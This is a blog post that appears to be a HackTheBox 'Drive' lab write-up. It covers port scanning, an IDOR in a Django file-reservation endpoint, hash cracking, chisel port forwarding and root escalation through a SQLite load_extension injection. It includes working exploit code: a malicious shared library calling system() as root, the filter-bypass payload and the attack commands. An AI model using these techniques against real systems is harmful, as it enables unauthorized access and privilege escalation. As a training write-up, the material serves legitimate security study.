---
author: NotCare
pubDatetime: 2023-12-02T13:00:00Z
title: HTB: Drive Writeup
postSlug: htb-drive-writeup
featured: true
draft: false
tags:
  - htb
  - writeup
  - hackthebox
  - drive
ogImage: ""
description: Exploiting unauthenticated endpoints and reversing a binary
---

# Abstract

Machine name: HTB Drive<br>
Level: Hard<br>
Machine OS: Linux<br>
Link: <a href="https://app.hackthebox.com/machines/Drive">Drive</a> <br>

Drive is a linux machine about enumerating and finding a unauthenticated endpoint which lets you reserve file so you can read it, which leads to Information Disclosure which leads to initial foothold on the box. From then on, we find a gitea instance running, which we port forward it with chisel to find the password for 7z archives, after cracking those hashes, we login as another user to get user.txt. For privesc, we reverse engineer a binary and exploit sqlite3 load_extension module, lets get into it!

# Table of Contents

# Kill Chain

*[Image: image]*

# Recon

## Full port scan

Let's start with a full port scan with nmap</br>
cmd:

```bash
nmap -p- IP --min-rate=2000 -vvv
```

o/p:

```bash
PORT      STATE    SERVICE    REASON
22/tcp    open     ssh        syn-ack
80/tcp    open     http       syn-ack
2887/tcp  filtered aironetddp no-response
3000/tcp  filtered ppp        no-response
8257/tcp  filtered unknown    no-response
18832/tcp filtered unknown    no-response
19488/tcp filtered unknown    no-response
31934/tcp filtered unknown    no-response
37592/tcp filtered unknown    no-response
42059/tcp filtered unknown    no-response
60721/tcp filtered unknown    no-response
```

we see there are just two ports open and other are filtered so we will keep our focus to open ports, now lets start service detection on these open ports

## Service scan

cmd:

```bash
nmap -sC -sV -p22,80 -oN drive.nmap IP
```

o/p:

```bash
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)                                                                    | ssh-hostkey:                                                                   |   3072 275a9fdb91c316e57da60d6dcb6bbd4a (RSA)                                  |   256 9d076bc847280df29f81f2b8c3a67853 (ECDSA)
|_  256 1d30349f797369bdf667f3343c1ff94e (ED25519)

80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Doodle Grive
```

lets head over to port 80

# drive.htb

upon visiting the site we get the following, so its basically a website about storing files like a google drive

*[Image: image]*
upon registering we get the upload file and dashboard button, lets check it out

after registering
*[Image: image]*

lets visit dashboard

dashboard /home
the dashboard brings us to what files are there and its information
*[Image: image]*

- Files
  *[Image: image]*

## upload file

*[Image: image]*

- Reserve files
  It lets you reserve files under your name, with this you can essentially edit the content of unreserved files and view it. this will help later

- Unreserve files
  it lets you unreserve files, meaning its out there for anyone to view it and own it under their name

- View file
  *[Image: image]*
  we see that our file number is `112` lets try other files

## idor fuzzing

lets fuzz file
*[Image: image]*
99 returns unauth, so we know the file exists

*[Image: image]*
999 returns server error so we can conclude the file doesnt exist
python script

```python
f = open("numbers.txt",'w')
for i in range(0,999):
    f.write(str(i)+"\n")
f.close()
```

lets create a wordlist 0-999 and send it to wfuzz to check for other files
cmd:

```bash
wfuzz -u http://drive.htb/FUZZ/getFileDetail/ -w numbers.txt --follow --hw 11 -p localhost:8080 -b "sessionid=wxi6mpbfs1dqhj5b4id8oik2o8fze7po"
-w for wordlist
--follow follows redirect
-p ran it through burp
-b our sessionid
```

o/p:
*[Image: image]*
we get some files, out of which 100 is the admin file on homepage and 112,115 is our files. lets see if we can reserve the other files under our name.

## exploitation

so the vulnerability lies in the `reserve` functionality, where you can pass in any file and it will reserve the file for you meaning only you can read it so we can take advantage of this

*[Image: image]*
after intercepting the `Reserve` request, we change the file id to `79` and send the request to receive the following request. it appears to be password for martin
*[Image: image]*
The funny thing is the above `Reserve` is the only attack vector vulnerable, when you go to `Files > ReserveFiles` it sends a POST request to `/blockFile` in contrast to when you go from `Dashboard > Reserve` files it sends a GET request to `/[id]/block` so those two are different functionality keep in mind.

After retrieving the other files we find they're also taking about databases file.
*[Image: image]*
again this will help us later, therefore you must have your enumeration game tight!

# Initial Foothold

we get the foothold of the machine by ssh-ing into the machine
*[Image: image]*
we find that there are three other local users, lets further enumerate the machine

*[Image: image]*

we cant run any commands as sudo

```bash
sudo -l
users and group
```

lets see the process list
cmd:

```bash
ps -ef --forest
```

o/p
*[Image: image]*

let's see what ports are active

```bash
ss -anltp
```

*[Image: image]*
we see theres `3306 33060` which is `mysql` and `3000` port. we can curl port 3000 it to confirm its a gitea instance

From here on, we port forward it

## chisel reverse port forward

```bash
on target machine
./chisel client 10.10.16.68:9001 R:3000:127.0.0.1:3000
```

```bash
on attacking machine
./chisel_1.9.1_linux_amd64 server -p 9001 --reverse
```

## gitea

*[Image: image]*
well, we dont have any password for any user, so we are still missing a piece.
Now if we remember from the fuzzing we found a file that talked about databases in `/var/www/backups`, lets cd into it to find

## database file

*[Image: image]*
the backups db are password protected and we couldnt crack it, but if we try the `db.sqlite3` db we can see theres a table called `accounts_customer`

*[Image: image]*

*[Image: image]*
The hash format is `124` `Django (SHA-1)`,we could only crack the hash for
`tom@drive.htb:[REDACTED]` but oh bummer, we cant ssh as tom.
lets try gitea creds for martinCruz since we know his username now and we get logged in

*[Image: image]*

*[Image: image]*

we find the password for 7z zip file in `db_backup.sh`
we transfer the db in `/var/www/backups` files form target machine to our machine and use it to extract the db files. The passwords are under `accounts_customuser` table.

now, one thing here is the `1_Dec_db_backup.sqlite3.7z` had a different hash type and it was taking its sweet time to crack it so we skipped that one, the other hashes we found were able to crack

```bash
hash from oct sqlite
sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141:[REDACTED]

hash from Nov sqlite
sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:[REDACTED]
```

only one password works for tom and thats in `1_Nov_db_backup.sqlite3.7z` and we get user.txt

after cracking the password for tom and ssh into the machine to get user.txt
*[Image: image]*

# privesc

From the symbol table we find the main_menu function which seems to be the main entry point for the binary, and from there we find the username and password
`moriarty:[REDACTED]`

*[Image: image]*

looking at the main_menu function we get
*[Image: image]*

## exploitation

so in order to exploit this, the main thing were looking out for is user input in any of the functions, and in fact we do have one function called `5. Activate user account`

- activate_user_account
  *[Image: image]*
  as we can see the if condition checks if the username is empty, and when its not (else block) it calls a function called `sanitize_string`, lets check it out

- sanitize_string

```c

void sanitize_string(long username)

{
  bool bVar1;
  ulong uVar2;
  long in_FS_OFFSET;
  int local_3c;
  int local_38;
  uint i;
  undefined8 blacklist;
  undefined local_21;
  long local_20;

  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_3c = 0;
  blacklist = 0x5c7b2f7c20270a00; //array of blacklist char \{/| '
  local_21 = 0x3b; // ; semicolor
  local_38 = 0;
  do {
    uVar2 = FUN_00401180(username);
    if (uVar2 <= (ulong)(long)local_38) {
      *(undefined *)(username + local_3c) = 0;
      if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail(); //stack smashing detection function
      }
      return;
    }
    bVar1 = false;
    for (i = 0; i < 9; i = i + 1) {
      if (*(char *)(username + local_38) == *(char *)((long)&blacklist + (long)(int)i)) {
        bVar1 = true; //if username has blacklist char, break
        break;
      }
    }
    if (!bVar1) {
      *(undefined *)(local_3c + username) = *(undefined *)(local_38 + username);
      local_3c = local_3c + 1; // do something? idk
    }
    local_38 = local_38 + 1; //no idea either?
  } while( true );
}
```

so with this link
https://stackoverflow.com/questions/12424883/is-it-possible-to-test-if-loading-extensions-is-enabled-in-sqlite-3
we see that the load_extension is enabled
*[Image: image]*

Now the whole idea of the exploit is to load a malicious module, which could be anything like reading root.txt or setting SUID on /bin/bash, so we create a malicious `C file` to `cat root.txt`

its also important to note that the load_extension takes in shared library files, now if we look at the documentation of sqlite https://www.sqlite.org/loadext.html,
*[Image: Alt text]*

reading further down we also see them mentioning the naming convetion of load_extension
*[Image: image]*
armed with this information and sanitize_string check we need to do the following

- Dont overrun the username input limit (48 characters)
  *[Image: image]*
- name our extension like `sqlite3_[ONE LETTER]_init`
- substitute for blacklisted characers (use decimal to substitute for `.` from ascii table)
- escape the query
- the effective query becomes

```bash
"/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SE T is_active=1 WHERE username=\"\""+load_extension(char(46,47,98))+"\'"
```

## steps

1. create a c file

```c
#include <unistd.h>
#include<stdlib.h>
void sqlite3_b_init() {
        setuid(0);
        setgid(0);
        system("/usr/bin/cat /root/root.txt > /tmp/guys.txt");
}
```

2. compile it as a shared library

```bash
 gcc -shared -o b.so -fPIC b.c
```

3. run the binary -> login -> select option 5
   *[Image: image]*
4. exit out and cat`/tmp/guys.txt`
   *[Image: image]*

- sql query

```sql
"/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SE T is_active=1 WHERE username=\"\";\'"
```

payload

```bash
"+load_extension(char(46,47,98))+"
46 is . in ascii dec
47 is / in ascii dec
98 is b in ascii dec
```

side node: i tried getting a reverse shell but its broken i couldnt run any commands

# source code analysis

- file object structure

```python
class File(models.Model):
    name = models.CharField(max_length=50 , unique=True)
    file = models.FileField(upload_to=get_upload_path )
    owner  = models.ForeignKey(
        CustomUser,
        on_delete=models.CASCADE,
    )

    block  = models.ForeignKey(CustomUser, null=True,on_delete=models.SET_NULL  ,blank=True , related_name='block')

    content = models.TextField(default="none")
    createdDate  = models.DateTimeField(auto_now_add=True)
    groups = models.ManyToManyField(G)

    def __str__(self):
        return self.name
```

The File object structure has a field called `block` if its null then the `/[id]/block` and /`blockFile` will work

- block_one_file

```python
def block_one_file(request, id):
    user = request.user
    file = get_object_or_404(File, id = id)
    file.block = user
    file.save()
    groups = file.groups.all()
    userGroups = user.g_set.all()
    level = 0
    for group in groups:
        if userGroups.filter(id = group.id ).exists(): #l.g_set.all().filter(id = f.id).exists()
            level = 1
            break
    #log action
    log_record = {'user': request.user.username  , 'method' : 'blockFile' , 'file_name' : file.name , 'time_stamp': str(datetime.datetime.now())}
    log(log_record, 'files-log.json', 2)
    file_obj = open((SITE_ROOT+'/media/'+ str(file.file) ))
    data = file_obj.read()
    file.content = data.splitlines()
    return render(request , 'getFileDetail.html' , {'file': file , 'user':user  , 'level':level})

```

as we can see theres no check if we own the file or not and it directly blocks the files then log it
so the functionality of block_one_f
*[Image: image]*
when you hover over Reserver button you see `http://drive.htb/113/block/`
113 being the id of the file and after fuzzing for available files we get the idea on how to exploit it

- blockFile

```python
def blockFile(request):
    user = request.user
    if request.method == 'POST':
        files = File.objects.all().filter(name__in = request.POST.getlist('files'))
        user_Bloackable_File = File.objects.all().filter(groups__in = user.g_set.all()).distinct()
        try:
            with transaction.atomic():
                for file in files:
                    if file.block is None and file in user_Bloackable_File:
                        file.block = user
                        file.save()
                        #log action
                        log_record = {'user': request.user.username  , 'method' : 'blockFile' , 'file_name' : file.name , 'time_stamp': str(datetime.datetime.now())}
                        log(log_record, 'files-log.json', 2)
                    else:
                        1/0
        except:
            return JsonResponse({'status':'fail','message':'operation failed'})
        return JsonResponse({'status':'success','message':'files Reserved successfully'})

    mygroups = user.g_set.all()
    i = 0
    result = G.objects.none()
    while i< len(mygroups):
        result = list(chain(mygroups[i].file_set.all() , result))
        i = i+1
    result = set(result)
    return render( request, 'blockFile.html' , {'files': result})

```

here we see that theres a check `user_Bloackable_File` which retrieves the file thats owned by us to block it
and theres also another conditional `if file.block is None and file in user_Bloackable_File` so the first check is true the file is not blocked but the second check is false because we dont own the file and therefore it gets out of the conditional if and directly sends the response that operation is successful.

Thank you for reading!
